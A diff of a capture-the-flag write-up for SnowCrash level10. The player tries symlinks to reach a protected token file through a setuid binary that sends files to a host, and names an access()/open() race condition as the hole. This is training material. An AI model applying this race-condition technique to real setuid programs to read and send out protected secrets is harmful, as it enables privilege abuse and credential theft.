@@ -10,9 +10,19 @@ cat: token: Permission denied
 level10@SnowCrash:~$ ./level10
 ./level10 file host
 	sends file to host if you have access to it
+```
+Let's try: 
+```bash
 level10@SnowCrash:~$ ./level10 token localhost
 You don't have access to token
 ```
+Let's do a symlink on token: 
+```bash
+level10@SnowCrash:~$ ln -s /home/user/level10/token /tmp/final
+level10@SnowCrash:~$ ./level10 /tmp/final localhost
+You don't have access to /tmp/final
+```
+Fails... Let's analyze a bit `level10`:
 
 ```bash
 level10@SnowCrash:~$ strings level10
@@ -46,9 +56,6 @@ https://askubuntu.com/questions/301787/opening-a-port-for-listening
              arguments, or with options -s and -p respectively.`
 http://manpages.ubuntu.com/manpages/hirsute/en/man1/nc_openbsd.1.html
 
-
-So we can start to execute level10 with token on our IP address: `./level10 token 10.12.0.0` but it does not work as we don't have access to token. </br>
-Let's do a symlink on token: `ln -s /home/user/level10/token /tmp/final` and try `./level10 /tmp/final 10.12.0.0` -> It does not work as we don't have access to /tmp/final.</br>
 
 `strings level10` shows that level10 does an access() then an open(). This is a security hole. 
 
